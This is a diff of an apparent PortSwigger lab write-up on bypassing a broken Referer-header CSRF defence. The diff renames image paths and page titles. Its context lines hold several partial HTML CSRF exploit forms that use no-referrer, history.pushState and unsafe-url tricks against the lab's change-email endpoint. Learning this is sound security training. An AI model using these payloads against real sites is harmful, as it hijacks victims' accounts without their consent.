@@ -18,13 +18,13 @@ You can log in to your own account using the following credentials: `wiener:pete
 
 **Home page:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215052029.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052029.png)
 
 **Login as user `wiener`:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215052052.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052052.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215052057.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052057.png)
 
 In the previous labs, we found that the email change functionality is vulnerable to CSRF.
 
@@ -41,13 +41,13 @@ In here, we can see that there is **no CSRF token**.
 
 **Now, we can use the `exploit serevr` to test CSRF attack:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215052342.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052342.png)
 
 **Then, we can craft a HTML form that performs CSRF attack on the victim:**
 ```html
 <html>
     <head>
-        <title>CSRF-8</title>
+        <title>CSRF-12</title>
     </head>
     <body>
         <form action="https://0a9400bc039e5e9ac050dc50005c009b.web-security-academy.net/my-account/change-email" method="POST">
@@ -63,9 +63,9 @@ In here, we can see that there is **no CSRF token**.
 
 **To test is will work or not, I'll use the `View exploit` button:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215052529.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052529.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215052546.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052546.png)
 
 However, it outputs an error: `Invalid referer header`.
 
@@ -74,7 +74,7 @@ However, it outputs an error: `Invalid referer header`.
 <html>
     <head>
         <meta name="referrer" content="no-referrer">
-        <title>CSRF-8</title>
+        <title>CSRF-12</title>
     </head>
     <body>
         <form action="https://0a9400bc039e5e9ac050dc50005c009b.web-security-academy.net/my-account/change-email" method="POST">
@@ -90,9 +90,9 @@ However, it outputs an error: `Invalid referer header`.
 
 **Let's try that again:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215052723.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052723.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215052738.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052738.png)
 
 Hmm... We still get an `Invalid referer header` error.
 
@@ -100,17 +100,17 @@ Hmm... We still get an `Invalid referer header` error.
 
 **Let's check that in Burp Suite's Repeater:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215053511.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215053511.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215053540.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215053540.png)
 
 **In here, we can try to send a different URL in the `Referer` header:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215053634.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215053634.png)
 
 **Then, what if I try to append a GET parameter after the expected value?**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215054242.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215054242.png)
 
 It still works!
 
@@ -118,13 +118,13 @@ It still works!
 
 **According the [Mozilla web docs](https://developer.mozilla.org/en-US/docs/Web/API/History/pushState), we can use a JavaScript function called `history.pushState()`:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215054430.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215054430.png)
 
 **To bypass that check, we can add the `history.pushState()` function in our exploit:**
 ```html
 <html>
     <head>
-        <title>CSRF-8</title>
+        <title>CSRF-12</title>
     </head>
     <body>
         <form action="https://0a9400bc039e5e9ac050dc50005c009b.web-security-academy.net/my-account/change-email" method="POST">
@@ -148,7 +148,7 @@ However, this still couldn't work, as many browsers now strip the query string f
 <html>
     <head>
         <meta name="referrer" content="unsafe-url">
-        <title>CSRF-8</title>
+        <title>CSRF-12</title>
     </head>
     <body>
         <form action="https://0a9400bc039e5e9ac050dc50005c009b.web-security-academy.net/my-account/change-email" method="POST">
@@ -165,9 +165,9 @@ However, this still couldn't work, as many browsers now strip the query string f
 
 **Finally, we can send this exploit to a victim:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215054941.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215054941.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020221215054955.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215054955.png)
 
 We successfully changed a victim email address!
 
